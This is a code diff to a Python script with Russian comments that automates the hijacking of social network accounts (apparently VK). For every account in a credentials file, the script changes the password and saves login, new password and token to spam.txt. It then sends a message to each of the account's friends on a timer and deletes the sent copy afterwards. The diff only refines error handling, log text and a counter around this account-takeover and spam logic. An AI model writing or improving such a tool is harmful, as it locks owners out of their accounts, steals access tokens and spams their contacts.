@@ -32,15 +32,12 @@ def change_password(auth_data, new_password):
     }
     try:
         resp = requests.get(method, params=params)
-        token = resp.json().get('response').get('token')
         resp_json = resp.json()
-        if token is None:
-            return
-
         print(resp.json())
 
         # Если смена пароля успешна, то записываем в файл spam.txt
-        if resp.status_code == requests.codes.ok and 'response' in resp_json:
+        if 'response' in resp_json:
+            token = resp_json.get('response').get('token')
             with open('spam.txt', 'a') as file:
                 file.write(f'{auth_data[0]}:{new_password}:{token}\n')
             print('[INFO] Смена пароля выполнена успешно!\n'
@@ -56,9 +53,11 @@ def change_password(auth_data, new_password):
                 resp = requests.get(method, params={**params, **captcha_send})
                 token = resp.json().get('response').get('token')
                 return token
+            elif resp_json.get('error').get('error_code') == 5:
+                print('[ERROR] Авторизация пользователя не удалась.')
+                return
         else:
             print('[ERROR] Смена пароля не выполнена.')
-            print(resp.json())
     except Exception as err:
         print(f'[ERROR] Произошла ошибка при попытке отправки запроса на смену пароля:\n'
               f'{err}')
@@ -275,7 +274,7 @@ def send_me_msg(user_id, token):
         id_msg = resp.get('response')
 
         if 'response' in resp:
-            print('[INFO] Сообщение отправлено.')
+            print('[INFO] Сообщение для рассылки отправлено.')
             return id_msg
         elif 'error' in resp:
             if resp.get('error').get('error_code') == 14:
@@ -322,7 +321,7 @@ def send_msg(friend, message_txt, forward_msg, token):
                 'v': '5.131'
             }
             resp_del_msg = requests.get(method_delete_msg, params_delete_msg).json()
-            if 'response' in resp_del_msg and 1 in resp_del_msg.get('response').get(message_id) == 1:
+            if 'response' in resp_del_msg:
                 print('[INFO] Сообщение удалено.')
             else:
                 print('[ERROR] Возникла ошибка при удалении сообщения.\n'
@@ -342,7 +341,7 @@ def send_msg(friend, message_txt, forward_msg, token):
             print('[ERROR] Сообщение не отправлено.')
             print(resp.json())
     except Exception as err:
-        print('[ERROR] Возникла ошибка при отправке сообщения.\n'
+        print('[ERROR] Возникла ошибка при отправке сообщения или удалении.\n'
               f'{err}')
 
 
@@ -406,6 +405,7 @@ def main():
     message_txt = input('Введите текст сообщения: ')
     auth_data = read_token()
 
+    count_account = 1
     for auth in auth_data:
         auth_data_list = auth.strip('\n').split(':')
         token = change_password(auth_data_list, new_password)
@@ -422,15 +422,14 @@ def main():
         id_msg = send_me_msg(user_id=user_info[0], token=token)
 
         count_friends = 0
-        count_account = 0
         for friend in friends:
             send_msg(friend=friend, message_txt=message_txt, forward_msg=id_msg, token=token)
             count_friends += 1
-            count_account += 1
             print(f'[INFO] Сообщение {count_friends} из {len(friends)}.\n'
                   f'[INFO] Аккаунт {count_account} из {len(auth_data)}.\n'
                   f'Пауза на {wait} секунд.')
             sleep(wait)
+        count_account += 1
 
 
 if __name__ == '__main__':
